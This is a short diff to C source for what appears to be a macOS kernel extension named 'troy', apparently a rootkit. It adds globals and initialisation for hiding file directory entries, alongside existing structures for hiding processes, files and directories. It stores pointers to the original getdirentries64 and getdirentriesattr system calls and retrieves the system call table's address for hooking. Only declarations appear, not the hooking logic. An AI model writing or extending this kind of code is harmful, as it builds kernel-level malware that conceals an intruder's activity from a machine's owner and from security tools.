@@ -34,12 +34,15 @@ lck_mtx_t *lck_mtx_hide_process=NULL;
 lck_mtx_t *lck_mtx_hide_file=NULL;
 lck_mtx_t *lck_mtx_hide_directory=NULL;
 lck_mtx_t *lck_mtx_hide_proc_array=NULL;
+lck_rw_t *lck_rw_hide_file_dirent_array=NULL;
 
 #pragma mark - original function
 getdirentries64_function_prototype my_getdirentries64=NULL; //hide the directory
+getdirentriesattr_function_prototype my_getdirentriseattr=NULL;
 
 #pragma mark - TAILQ
 struct hide_proc_list hide_proc_array;  //for store process that is hide
+struct hide_file_dirent_list hide_file_dirent_array;
 
 kern_return_t troy_start(kmod_info_t * ki, void *d)
 {
@@ -58,6 +61,7 @@ kern_return_t troy_start(kmod_info_t * ki, void *d)
     }
 
     TAILQ_INIT(&hide_proc_array);   //init process array that the process is hidden
+    TAILQ_INIT(&hide_file_dirent_array);
 
     system_table = GetSystemTable();    //get system table's address
 
